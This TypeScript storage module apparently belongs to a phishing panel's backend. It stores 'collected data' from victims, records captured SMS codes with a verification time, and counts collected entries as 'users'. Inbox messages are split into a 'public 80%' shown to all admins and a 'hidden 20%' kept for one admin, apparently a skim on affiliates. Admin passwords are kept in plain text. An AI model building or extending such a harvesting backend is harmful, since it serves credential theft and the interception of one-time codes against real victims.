import { db } from "./db";
import { users, collectedData, admins, inboxMessages, type User, type InsertUser, type CollectedData, type InsertCollectedData, type Admin, type InboxMessage, type InsertInboxMessage } from "@shared/schema";
import { eq, desc, sql } from "drizzle-orm";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByEmail(email: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUserVerification(id: string, isVerified: boolean): Promise<User | undefined>;
  
  createCollectedData(data: InsertCollectedData): Promise<CollectedData>;
  updateCollectedDataSms(id: string, smsCode: string): Promise<CollectedData | undefined>;
  getAllCollectedData(): Promise<CollectedData[]>;
  getCollectedDataById(id: string): Promise<CollectedData | undefined>;
  
  getAdminByUsername(username: string): Promise<Admin | undefined>;
  createAdmin(username: string, password: string, role: string): Promise<Admin>;
  
  createInboxMessage(message: InsertInboxMessage): Promise<InboxMessage>;
  getInboxMessages(): Promise<InboxMessage[]>;
  getHiddenInboxMessages(): Promise<InboxMessage[]>;
  countTotalUsers(): Promise<number>;
}

export class DbStorage implements IStorage {
  async getUser(id: string): Promise<User | undefined> {
    const result = await db.select().from(users).where(eq(users.id, id)).limit(1);
    return result[0];
  }

  async getUserByEmail(email: string): Promise<User | undefined> {
    const result = await db.select().from(users).where(eq(users.email, email)).limit(1);
    return result[0];
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const result = await db.insert(users).values(insertUser).returning();
    return result[0];
  }

  async updateUserVerification(id: string, isVerified: boolean): Promise<User | undefined> {
    const result = await db.update(users)
      .set({ isVerified })
      .where(eq(users.id, id))
      .returning();
    return result[0];
  }

  async createCollectedData(data: InsertCollectedData): Promise<CollectedData> {
    const result = await db.insert(collectedData).values(data).returning();
    return result[0];
  }

  async updateCollectedDataSms(id: string, smsCode: string): Promise<CollectedData | undefined> {
    const result = await db.update(collectedData)
      .set({ 
        smsCode,
        verifiedAt: new Date()
      })
      .where(eq(collectedData.id, id))
      .returning();
    return result[0];
  }

  async getAllCollectedData(): Promise<CollectedData[]> {
    return await db.select().from(collectedData).orderBy(desc(collectedData.createdAt));
  }

  async getCollectedDataById(id: string): Promise<CollectedData | undefined> {
    const result = await db.select().from(collectedData).where(eq(collectedData.id, id)).limit(1);
    return result[0];
  }

  async getAdminByUsername(username: string): Promise<Admin | undefined> {
    const result = await db.select().from(admins).where(eq(admins.username, username)).limit(1);
    return result[0];
  }

  async createAdmin(username: string, password: string, role: string): Promise<Admin> {
    const result = await db.insert(admins).values({
      username,
      password,
      role,
    }).returning();
    return result[0];
  }

  async createInboxMessage(message: InsertInboxMessage): Promise<InboxMessage> {
    const result = await db.insert(inboxMessages).values(message).returning();
    return result[0];
  }

  async getInboxMessages(): Promise<InboxMessage[]> {
    // Get only public messages (80%) - visible to all admins
    return await db.select().from(inboxMessages)
      .where(eq(inboxMessages.isHidden, false))
      .orderBy(desc(inboxMessages.createdAt));
  }

  async getHiddenInboxMessages(): Promise<InboxMessage[]> {
    // Only for admin - get hidden messages (20%)
    return await db.select().from(inboxMessages)
      .where(eq(inboxMessages.isHidden, true))
      .orderBy(desc(inboxMessages.createdAt));
  }

  async countTotalUsers(): Promise<number> {
    const result = await db.select({ count: sql<number>`count(*)` }).from(collectedData);
    return Number(result[0].count);
  }
}

export const storage = new DbStorage();
